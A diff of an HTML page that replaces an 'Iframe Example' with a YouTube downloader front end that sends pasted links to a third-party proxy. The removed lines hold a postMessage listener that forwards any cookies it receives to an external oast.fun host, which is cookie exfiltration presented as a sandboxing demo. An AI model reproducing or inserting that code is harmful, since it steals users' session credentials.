@@ -3,59 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Iframe Example</title>
+    <title>YT Video Downloader</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2rem;
+        }
+
+        .container {
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 600px;
+            margin-top: 2rem;
+        }
+
+        h1 {
+            color: #ff0000;
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        .input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 1rem;
+        }
+
+        input {
+            flex: 1;
+            padding: 0.8rem;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        button {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: opacity 0.3s;
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        .disclaimer {
+            margin-top: 2rem;
+            color: #666;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+
+        .loader {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff0000;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 1rem auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 1rem;
+            }
+            
+            .input-group {
+                flex-direction: column;
+            }
+        }
+    </style>
 </head>
 <body>
-    <h1>Iframe Example</h1>
+    <div class="container">
+        <h1>YouTube Video Downloader</h1>
+        <div class="input-group">
+            <input type="url" id="urlInput" placeholder="Paste YouTube URL here...">
+            <button onclick="handleDownload()">Download</button>
+        </div>
+        <div class="loader" id="loader"></div>
+        <div class="disclaimer">
+            <p>⚠️ Disclaimer: This tool is for personal use only. Ensure you have the right to download any content. We are not responsible for copyright violations.</p>
+        </div>
+    </div>
 
-    <!-- Create the iframe dynamically -->
     <script>
-        // Create the iframe element
-        const iframe = document.createElement('iframe');
-        
-        // Set the sandbox attributes for the iframe to limit parent access
-        iframe.sandbox.add('allow-scripts');   // Allow running scripts in the iframe
-        iframe.sandbox.add('allow-forms');     // Allow form submission
-        // No 'allow-same-origin' – This ensures the iframe is treated as a separate origin from the parent
+        function isValidYouTubeUrl(url) {
+            const pattern = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\/.+/;
+            return pattern.test(url);
+        }
 
-        // Set the source URL for the iframe (replace with your desired URL)
-        iframe.src = 'https://boomplay.com'; // External source
-        
-        // Set the iframe dimensions
-        iframe.width = '800';
-        iframe.height = '600';
-        
-        // Append iframe to the body
-        document.body.appendChild(iframe);
-
-        // Log iframe creation
-        console.log('Iframe created with sandbox attributes: allow-scripts, allow-forms (No allow-same-origin)');
-
-        // Listen for messages from the iframe
-        window.addEventListener('message', (event) => {
-            if (event.origin !== 'https://boomplay.com') {
-                console.warn('Message origin is not trusted');
-                return; // Reject the message if it comes from an untrusted source
+        function handleDownload() {
+            const url = document.getElementById('urlInput').value;
+            const loader = document.getElementById('loader');
+            
+            if (!isValidYouTubeUrl(url)) {
+                alert('Please enter a valid YouTube URL');
+                return;
             }
 
-            if (event.data && event.data.cookies) {
-                // Send the cookies received from iframe to the external server
-                fetch('https://tetenplixlclsrgugyrk29jxjsbg98hkd.oast.fun', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        cookies: event.data.cookies,
-                    }),
-                    credentials: 'include' // Include credentials (cookies) with the request
-                })
-                .then(response => response.json())
-                .then(data => console.log('Cookies sent to external server:', data))
-                .catch(error => console.error('Error sending cookies:', error));
+            loader.style.display = 'block';
+            
+            try {
+                // This is a placeholder for actual download functionality
+                // In a real implementation, you would need a backend service
+                const videoId = url.split('v=')[1];
+                const proxyUrl = `https://ytdl.cyclic.app/download?url=${encodeURIComponent(url)}`;
+                
+                // Redirect to download URL
+                window.open(proxyUrl, '_blank');
+            } catch (error) {
+                alert('Error downloading video: ' + error.message);
+            } finally {
+                loader.style.display = 'none';
             }
-        });
-
+        }
     </script>
 </body>
 </html>
